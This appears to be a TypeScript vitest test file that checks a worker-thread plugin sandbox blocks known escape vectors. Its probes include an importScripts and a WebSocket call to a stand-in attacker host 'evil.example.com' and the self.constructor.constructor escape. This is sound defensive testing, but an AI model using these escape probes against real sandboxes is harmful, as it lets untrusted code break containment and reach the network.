/**
 * Real-Worker sandbox escape tests.
 *
 * Spawns a Node worker_threads Worker, runs the real BOOTSTRAP_SOURCE
 * inside it, then tries each known escape vector. The test asserts each
 * vector is either unavailable (throws on access) or defanged (throws
 * on invocation). A regression in the kill-list would light up here.
 *
 * worker_threads is close to but not identical to a browser Web Worker:
 * `Blob`, `URL.createObjectURL`, `import()` of blob URLs are unavailable.
 * For those escape probes we skip the dynamic-module load and exercise
 * the kill-IIFE + global-overrides directly. Real-browser runtime
 * behavior is covered separately by the host-app Playwright tests.
 */

import { describe, expect, it } from "vitest";
import { Worker } from "node:worker_threads";
import { BOOTSTRAP_SOURCE } from "../src/bootstrap-source.js";

interface ProbeResult {
  ok: boolean;
  error?: string;
  value?: unknown;
}

/**
 * Run the bootstrap, then execute `probe` (a function body as a string)
 * inside the worker and return whatever it sends back.
 */
function runProbe(probe: string, timeoutMs = 5_000): Promise<ProbeResult> {
  // Translate the web-Worker bootstrap to run under worker_threads: the
  // bootstrap uses `self.postMessage` / `self.addEventListener`, which
  // worker_threads doesn't expose by default. We shim `self` to
  // `parentPort`-adapting API before loading the bootstrap.
  const shim = `
    const { parentPort } = require('node:worker_threads');
    const listeners = { message: [], error: [] };
    globalThis.self = globalThis;
    globalThis.postMessage = (m) => parentPort.postMessage(m);
    globalThis.addEventListener = (type, fn) => { (listeners[type] ||= []).push(fn); };
    parentPort.on('message', (m) => {
      for (const l of listeners.message || []) l({ data: m });
    });
    // Capture the real Function BEFORE the bootstrap's kill-IIFE redefines
    // it, so our probe harness can still compile a probe body. Plugins
    // would never get this reference; the harness loads first by design.
    const __hostFunction = Function;
    // Execute the real bootstrap source in this scope.
    ${BOOTSTRAP_SOURCE}
    // Install a probe RPC: host sends {kind:"probe", body:"..."} and the
    // worker evals the body using the captured Function and posts the
    // result back.
    parentPort.on('message', async (m) => {
      if (!m || m.kind !== 'probe') return;
      let result;
      try {
        const fn = __hostFunction('return (async () => { ' + m.body + ' })();');
        result = { ok: true, value: await fn() };
      } catch (err) {
        result = { ok: false, error: String(err && err.message ? err.message : err) };
      }
      parentPort.postMessage({ kind: 'probeResult', result });
    });
  `;
  return new Promise((resolve, reject) => {
    const worker = new Worker(shim, { eval: true });
    const timer = setTimeout(() => {
      worker.terminate();
      reject(new Error("probe timeout"));
    }, timeoutMs);
    worker.on("message", (m) => {
      if (m && m.kind === "probeResult") {
        clearTimeout(timer);
        worker.terminate();
        resolve(m.result as ProbeResult);
      }
    });
    worker.on("error", (err) => {
      clearTimeout(timer);
      worker.terminate();
      reject(err);
    });
    worker.postMessage({ kind: "probe", body: probe });
  });
}

// Every "bad" probe should report ok:false (meaning the in-worker call
// threw). Anything that reports ok:true means the escape succeeded.
async function expectBlocked(probe: string): Promise<string> {
  const res = await runProbe(probe);
  expect(res.ok, `probe unexpectedly succeeded: ${JSON.stringify(res.value)}`).toBe(false);
  return res.error ?? "";
}

describe("sandbox escape vectors are blocked", () => {
  it("fetch is unavailable", async () => {
    const err = await expectBlocked("return fetch('https://example.com');");
    expect(err).toMatch(/fetch/);
  });

  it("XMLHttpRequest is unavailable", async () => {
    const err = await expectBlocked("return new XMLHttpRequest();");
    expect(err).toMatch(/XMLHttpRequest|is not available/);
  });

  it("WebSocket is unavailable", async () => {
    await expectBlocked("return new WebSocket('wss://evil.example.com');");
  });

  it("BroadcastChannel is unavailable", async () => {
    const err = await expectBlocked("return new BroadcastChannel('x');");
    expect(err).toMatch(/BroadcastChannel|is not available/);
  });

  it("MessageChannel is unavailable", async () => {
    const err = await expectBlocked("return new MessageChannel();");
    expect(err).toMatch(/MessageChannel|is not available/);
  });

  it("WebAssembly is unavailable", async () => {
    const err = await expectBlocked("return WebAssembly.instantiate(new Uint8Array(0));");
    expect(err).toMatch(/WebAssembly|is not available/);
  });

  it("importScripts is disabled (throws on call)", async () => {
    const err = await expectBlocked("return importScripts('https://evil.example.com/x.js');");
    expect(err).toMatch(/importScripts|is disabled/);
  });

  it("self.constructor escape is closed", async () => {
    // The classic escape: self.constructor.constructor('return fetch')()
    // The redefinition of `constructor` on self should make this throw or
    // yield a harmless value; either way, it must NOT return a callable
    // that reaches real fetch.
    const err = await expectBlocked(
      "const F = self.constructor.constructor; const reached = F('return fetch')(); " +
      "if (typeof reached === 'function' || typeof reached === 'object') return await reached; " +
      "throw new Error('self.constructor escape returned: ' + String(reached));",
    );
    // We expect either "fetch is not available" (if the Function did
    // execute but hit the killed fetch global) OR "dynamic Function() is
    // disabled" (if our replacement Function stub ran). Both are
    // acceptable — what we never want is a successful network call.
    expect(err).toMatch(/fetch|Function|is not available|disabled/);
  });

  it("eval is defanged", async () => {
    const err = await expectBlocked("return self.eval('1+1');");
    expect(err).toMatch(/eval|is disabled/);
  });

  it("localStorage / indexedDB / caches are unavailable", async () => {
    await expectBlocked("return localStorage.getItem('x');");
    await expectBlocked("return indexedDB.open('x');");
    await expectBlocked("return caches.open('x');");
  });

  it("Function.prototype is frozen (cannot be re-plumbed)", async () => {
    const err = await expectBlocked(
      "Function.prototype.maliciousInject = () => 'owned'; " +
      "if (Function.prototype.maliciousInject) return 'escape succeeded'; " +
      "throw new Error('frozen prototype held')",
    );
    expect(err).toMatch(/frozen|held|Cannot add property/);
  });

  it("nested Worker cannot be constructed", async () => {
    await expectBlocked("return new Worker('data:text/javascript,');");
  });
});
